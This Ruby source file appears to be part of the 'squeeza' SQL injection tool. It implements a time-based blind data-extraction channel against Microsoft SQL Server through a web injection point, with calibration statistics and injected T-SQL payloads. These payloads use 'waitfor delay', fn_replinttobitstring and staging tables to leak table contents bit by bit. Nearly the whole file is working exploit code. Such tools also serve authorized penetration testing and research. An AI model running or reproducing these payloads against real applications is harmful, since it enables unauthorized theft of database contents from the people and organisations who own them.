class SQLReturnChannelViaTime
	
	class InvalidVarFormat < Exception
	end

	class SigInt < Exception
	end

	class ReliabilityException < Exception
	end

	class OrderException < Exception
		attr_accessor(:line_num, :last_line_received, :byte_start, :last_byte_start)

		def initialize(line_num, last_line_received, byte_start, last_byte_start)
			self.line_num = line_num
			self.last_line_received = last_line_received
			self.byte_start = byte_start
			self.last_byte_start = last_byte_start
		end

		def to_s
			str = "Out of order or duplicate line. (line=#{line_num},last_line=#{last_line_received},byte_start=#{byte_start},last_byte_start=#{last_byte_start}"
			str
		end
	end
	
	def SQLReturnChannelViaTime.help
		puts "time return channel commands and variables"
		puts " commands"
		puts "  !calib  <n> : automatic calibration of time ranges. send 10 probe requests per 0/1 (or optional <n> probes)"
		puts " variables:"
		puts "  delay    : minimum time to wait for a 1-bit"
		puts "  outlier_weight : parameter that affects automatic calibration when discarding outliers "
		puts "  one_range  : a time range in which responses are deemed to be 1-bit"
		puts "  time_privs : one of high or low. a misnomer really, this is chosen automatically for you. leave well alone."
		puts "  zero_range : a time range in which responses are deemed to be 0-bit"
	end

	def help
		SQLReturnChannelViaTime.help
	end
	
	def initialize(http, config)
		@http = http
		@config = config

		raise HTTPException, "SQLReturnChannelViaTime requires a valid HTTP connection" if (@http.nil?)

		@sql_prefix = @config.getv("sql_prefix")
		@sql_prefix ||= ""
		@sql_postfix = @config.getv("sql_postfix")
		@sql_postfix ||= ""

		@config.setv("delay",1) if @config.getv("delay").nil?
		@config.setv("outlier_weight",1.5) if @config.getv("outlier_weight").nil?
		@config.setv("zero_range",0..0.3) if @config.getv("zero_range").nil?
		@config.setv("one_range",0.5..2.0) if @config.getv("one_range").nil?

		@config.set_command("calib")  {|probes| probes = 10 if probes.nil?;calibrate(probes) } if !@config.get_command("calib")
	end

	def stats(array)
		#work out quartiles, to discard outliers
		
		outlier_weight = 1.5
		
		ta = array.sort
		median_pos = ta.length/2-1
		if ta.length%2==0
			lower_half = ta[0..median_pos]
			upper_half = ta[median_pos+1..ta.length]
			median = (ta[median_pos-1]+ta[median_pos])/2
		else
			lower_half = ta[0..median_pos]
			upper_half = ta[median_pos+2..ta.length]
			median = ta[median_pos+1]
		end
	
		first_q_pos = lower_half.length/2-1
		third_q_pos = upper_half.length/2-1
		if lower_half.length%2==0
			first_q = lower_half[first_q_pos]
			third_q = upper_half[third_q_pos]
		else
			first_q = (lower_half[first_q_pos] + lower_half[first_q_pos+1])/2
			third_q = (upper_half[third_q_pos] + upper_half[third_q_pos+1])/2
		end
		
		iqr = third_q-first_q
		
		Debug.print("Q1 = #{first_q}, median = #{median}, Q3 = #{third_q}",1)
		#this boots out any calibration times greater than Q3 + 1.5 * IQR
		discarded=0
		array.collect!{|item| 
			if item<=third_q+outlier_weight*iqr
				item
			else
				discarded+=1
				Debug.print("Discarding time #{item}",1)
				nil
			end
		}.compact!
		Debug.print("Upper bound for discarding was #{third_q+outlier_weight*iqr}, threw away #{discarded} samples.")
		discarded = discarded.to_f/(array.length+discarded)*100

		if discarded >= 5
			Debug.print("NOTE: At least #{discarded}% of the sample set was discarded as outlierying points. On fast lines (or VMs :) this is overly cautious. Play with the 'outlier_weight' variable")
		end
		#work out mean and store ditribution buckets
		mean = 0.0
		buckets = {}
		array.each{|i| 
			mean+= i;
			index = (i*100).floor;
			index_in_zero = (index.to_f/10).to_i*10
			if index - index_in_zero > 5
				index = index_in_zero + 5
			else
				index = index_in_zero
			end	
			buckets[index] = 0 if buckets[index].nil?;buckets[index]+=1}
		mean = mean/array.length

		#display the response time distribution in 5ms buckets
		last_bucket = 0
		buckets.sort.each{|kv|
			(last_bucket+5).step(kv[0]-5,5){|empty| puts "[#{empty.to_s}] :" } if kv[0] > last_bucket + 5
			print "[#{kv[0]}] :"
			1.upto(kv[1]) {|i| print "#" }
			print "\n"
			last_bucket = kv[0]
		}
	
    #work out the sample stddev
		stddev = 0.0
		array.each{|i| stddev+=(mean-i)**2}
		stddev = Math.sqrt(stddev/(array.length-1))

		range = (mean-2*stddev)..(mean+2*stddev)
		return {:mean => mean, :stddev => stddev, :accept_range => range}

	end


	def calibrate(num_probes)
		trap("SIGINT") { raise Exception; }
		sql_bit_delay = "declare @a char(1),@e sysname;set @a=substring('01',BITNUM,1);set @e = '00:00:'+str(DELAYFUDGE*cast(@a as int));waitfor delay @e;"

		if num_probes.is_a?(String)
			num_probes = num_probes.to_i
		end

		#time 0's
		request = @sql_prefix + sql_bit_delay.sub(/BITNUM/,"1").sub(/DELAYFUDGE/,@config.getv("delay").to_s) + @sql_postfix 
		zeros = []
		1.upto(num_probes){|c|
			begin
				t = start_time
				@http.send(request)
				diff = end_time(t)
				zeros<< diff
				if c%5==0
					print "." 
					$stdout.flush
				end
			rescue HTTPException => e
				Debug.error("HTTP Error...")
				raise e
			end
		}
		print "\n"
		max_zero = 0.0
		zeros.each{|r| max_zero = r if r > max_zero}
		z_results = stats(zeros)

		puts "Zero mean  : #{z_results[:mean]}"
		puts "Zero stddev: #{z_results[:stddev]}"
		puts "Zero range : #{z_results[:accept_range]}"

		request = @sql_prefix + sql_bit_delay.sub(/BITNUM/,"2").sub(/DELAYFUDGE/,@config.getv("delay").to_s) + @sql_postfix 
		ones = []
		1.upto(num_probes){|c|
			begin
				t = start_time
				@http.send(request)
				diff = end_time(t)
				ones<< diff
				if c%5==0
					print "." 
					$stdout.flush
				end
			rescue HTTPException => e
				Debug.error("HTTP Error...")
				raise e
			end
		}
		print "\n"
		min_one = 9999999.0
		ones.each{|r| min_one = r if r < min_one}

		o_results = stats(ones)

		puts "Ones mean  : #{o_results[:mean]}"
		puts "Ones stddev: #{o_results[:stddev]}"
		puts "Ones range : #{o_results[:accept_range]}"

		puts "Difference in means: #{o_results[:mean]-z_results[:mean]}"
		puts "Difference in stddev: #{o_results[:stddev]-z_results[:stddev]}"
		puts "Max Zero: #{max_zero}"
		puts "Min One : #{min_one}"

		if o_results[:accept_range].begin < z_results[:accept_range].end+2*o_results[:stddev]
			Debug.print("Lower edge of range for 1 bits is not 2 stddevs away from upper edge of 0 bit range. Upping the SQL fudgefactor and trying again...")
			@config.setv("delay",@config.getv("delay").to_i+1)
			calibrate(num_probes)
		end

		@config.setv("zero_range",z_results[:accept_range])
		@config.setv("one_range", o_results[:accept_range])
		return nil

		rescue Exception
			Debug.print("Exiting calibration prematurely")
			return nil
	end

	def start(args)

		@current_line = 1
		@current_bit  = 1

		case @config.getv("time_privs")
		when "high"
			@sql_stage1_table = args['table']
			@sql_stage2_table = "#{@sql_stage1_table}2"
			#sql_build_stage_2 = "drop table #{@sql_stage2_table};create table #{@sql_stage2_table}(data varchar(8000), num int identity(1,1));declare @a as varchar(600),@b as int;set @b=1;select @a=data from #{@sql_stage1_table} where num=1;while charindex('ENDOFSQL',@a) = 0 or charindex('ENDOFSQL',@a) is null begin set @b=@b+1;declare @c as int, @d as varchar(8000);set @c=1;set @d='';while @c <= len(@a)begin set @d=@d+substring(fn_replinttobitstring(ascii(substring(@a, @c, 1))),25,8);set @c= @c+1;end;select @a=data from #{@sql_stage1_table} where num=@b;insert into #{@sql_stage2_table} values(@d);end; insert into #{@sql_stage2_table} values('00000001');"
			sql_build_stage_2 = "drop table #{@sql_stage2_table};create table #{@sql_stage2_table}(data text, num int);declare @b int,@i int,@a int,@c int, @d char(8),@p binary(16);select @b=count(num) from #{@sql_stage1_table};set @i=1;while @i<= @b begin select @a=datalength(data) from #{@sql_stage1_table} where num=@i;insert into #{@sql_stage2_table} values('',@i);set @c=1;set @d='';select @p=textptr(data) from #{@sql_stage2_table} where num=@i;while @c <= @a begin set @d=substring(fn_replinttobitstring(ascii((select substring(data,@c,1) from #{@sql_stage1_table} where num=@i))),25,8);updatetext #{@sql_stage2_table}.data @p NULL NULL @d;set @c=@c+1;end;set @i=@i+1;end;"
			
			request = @sql_prefix + sql_build_stage_2 + @sql_postfix
			Debug.print("Time to build stage 2, sending: #{sql_build_stage_2}",2)

			begin
				@http.send(request)
			rescue HTTPException => e
				Debug.error("HTTP Error...")
				raise e
			end
		when "low"
			@columnname = args['column_name']
			@tablename = args['table_name']
			@whereclause = args['where_clause']
		end

	end

	def start_time
		return Time.new
	end

	def end_time(start_time)
		return Time.now-start_time
	end

	def a2i(binary_array,radix)
		binary_array = binary_array.split(//) if binary_array.is_a?(String)

		i=radix;
		total=0;
		binary_array.each{|x|
			i-=1;
			total+=x.to_i*2**i
		};
		total
	end
	
	def get_bit(line_num, bit_num, sql=nil)
		trap("SIGINT") { Debug.print("Caught the SigInt, exiting loop",2); raise SigInt; }
		Debug.print("Started get_bit with line_num=#{line_num}, bit_num=#{bit_num}, sql=#{sql}",3)
		
		if sql.nil?
			#sql_stage_3 = "declare @a varchar(8000),@b sysname,@c sysname, @d int, @e sysname; select @a=data from #{@sql_stage2_table} where num=LINENUM; select @b=substring(@a,BITNUM,1); set @d=DELAYFUDGE * cast(@b as int);set @e = '00:00:'+str(@d);waitfor delay @e;"
			case @config.getv("time_privs")
			when "high"
				sql_stage_3 = "declare @a char(1),@e sysname;select @a=substring(data,BITNUM,1) from #{@sql_stage2_table} where num=LINENUM;set @e = '00:00:'+str(DELAYFUDGE*cast(@a as int));waitfor delay @e;"
			when "low"
				byte_num = (bit_num-1)/8+1
				bit_num = bit_num-8*(byte_num-1)
				sql_stage_3 = "declare @b int,@a char(1),@m varchar(8000),@e sysname;select @b=count(#{@columnname}) from #{@tablename}#{@whereclause};if LINENUM <= @b select top LINENUM @m=#{@columnname} from #{@tablename}#{@whereclause};else set @m='ENDOFSQL';set @a=substring(substring(fn_replinttobitstring(ascii((substring(@m,#{byte_num},1)))),25,8),#{bit_num},1);set @e = '00:00:'+str(DELAYFUDGE*cast(@a as int));waitfor delay @e;"
			else
				Debug.error("Invalid value for 'time_privs'")
				raise InvalidVarFormat
			end
		else
			sql_stage_3 = sql
		end

		request = @sql_prefix + sql_stage_3.gsub(/LINENUM/, line_num.to_s).gsub(/BITNUM/,bit_num.to_s).gsub(/DELAYFUDGE/,@config.getv("delay").to_s) + @sql_postfix
		Debug.print("#{request}",2)
		Debug.print("HTTP started",3)
		ended = false
		errors = 0
		out_of_range = 0
		z_range = @config.getv("zero_range")
		o_range = @config.getv("one_range")
		Debug.error("0 or 1 range is not defined!!! Things will break.") if z_range.nil? or o_range.nil?

		if z_range.is_a?String
			(start, finish) = z_range.split(/\.\./)
			raise InvalidVarFormat if finish.nil?
			z_range = Range.new start.to_f, finish.to_f
		end

		if o_range.is_a?String
			(start, finish) = o_range.split(/\.\./)
			raise InvalidVarFormat if finish.nil?
			o_range = Range.new start.to_f, finish.to_f
		end

		while !ended && errors < 3
			begin
				t = start_time
				@http.send(request)
				diff = end_time(t)
				
				Debug.print("difference was #{diff}",2)

				if z_range.include?diff 
					bit = 0
					ended = true
				elsif o_range.include?diff
					bit = 1
					ended = true
				else
					out_of_range += 1
					Debug.print("Time didn't fall into a category, discarding",2)
					Debug.error("#{out_of_range} consecutive requests didn't fall in a 0 or 1 range. Will continue, but you might want to Ctrl-C and run !calib") if out_of_range > 5
					if out_of_range > 20
						Debug.error("Too manu consecutive requests didn't satisfy a known range... stopping")
						ended = true
					end
				end
			rescue HTTPException => e
				errors += 1
				if errors <= 3
					Debug.print("HTTP Error... retrying",2)
				else	
					raise e
				end
			end
		end
		Debug.print("Line #{line_num}, bit #{bit_num} = #{bit}",2)
		Debug.print("HTTP exiting",3)
		return bit

		rescue SigInt
			return nil
	end

	def get_line_length(line)
		Debug.print("Getting line length",2)
		case @config.getv("time_privs")
		when "high"
			sql_line_length = "declare @a varchar(8000),@b int,@d int,@e sysname;select @a=datalength(data) from #{@sql_stage2_table} where num=LINENUM;select @b=substring(fn_replinttobitstring(@a),BITNUM,1);set @d=DELAYFUDGE * cast(@b as int)set @e = '00:00:'+str(@d);waitfor delay @e;"
		when "low"
			sql_line_length = "declare @a varchar(8000),@d int,@e sysname;if LINENUM<= (select count(#{@columnname}) from #{@tablename}#{@whereclause}) select top LINENUM @a=8*len(#{@columnname}) from #{@tablename}#{@whereclause} else set @a=8*len('ENDOFSQL');select @a=substring(fn_replinttobitstring(@a),BITNUM,1);set @d=DELAYFUDGE * cast(@a as int)set @e = '00:00:'+str(@d);waitfor delay @e;"
		end

		length = []
		1.upto(32){|i|
			bit = get_bit(line,i,sql_line_length)
			length << bit
		}

		decimal_length = a2i(length,32)
		Debug.print("Binary length of line #{} is #{length} or #{decimal_length}",2)
		
		decimal_length
	end
	
	def eachline(&block)
		

		continue = true
		lines = []
		zero_count = 0

		print "\n"
		if @config.getv("ansi") == "on"
			print_status = Proc.new {|linenum, bitnum, linelength|
				$stdout.write "#{27.chr}[1A#{27.chr}[0G Line #{linenum}: #{(bitnum.to_f/linelength*100).to_i}% (#{bitnum} of #{linelength})#{27.chr}[K\n"
			}
			$stdout.flush
		else
			print_status = nil
		end

		while continue
			trap("SIGINT") { Debug.print("Caught the sigint... exiting command loop",2); continue = false }
			bit = nil

			print "#{27.chr}[0GGetting line length#{27.chr}[K\n" if print_status.is_a?Proc
			length = get_line_length(@current_line)
			if length == 0
				zero_count+=1
			else
				zero_count=0
			end
			
			if zero_count >= 3
				Debug.error("Three zero length lines detected... might have skipped end of file marker or the sql could be broken. Stopping.")
				continue = false
			end

			bits_count = 0
			line = []
			while continue && bits_count < length 
			#consider this very carefully.... if the request takes too long, it is possible squeeza hits the tcpdump filtering 
			#before the server starts sending data... i don't think this is a problem but keep in mind.
			#
			#must experiment more
			#th = Thread.new(request) {|req|
				print_status.call(@current_line, bits_count, length) if print_status.is_a?Proc
				line << get_bit(@current_line, @current_bit)
				continue = false if line.last.nil?
				@current_bit+=1
				bits_count+=1
			end
			#}

			print "#{27.chr}[1A#{27.chr}[0G#{27.chr}[K" if print_status.is_a?Proc

			ascii_line = ""
			line.join.scan(/.{8,8}/).each{|x| ascii_line += a2i(x,8).chr}
			Debug.print("Got line #{@current_line}, #{line.join}, ascii #{ascii_line}",2)
			
			if ascii_line =~ /ENDOFSQL/
				continue = false
			else
				ascii_line = "" if ascii_line =~ /BLANKLINE/
				block.call(@current_line, ascii_line)
				lines << ascii_line
				@current_line += 1
				@current_bit = 1
			end
		end
		lines
	end
end
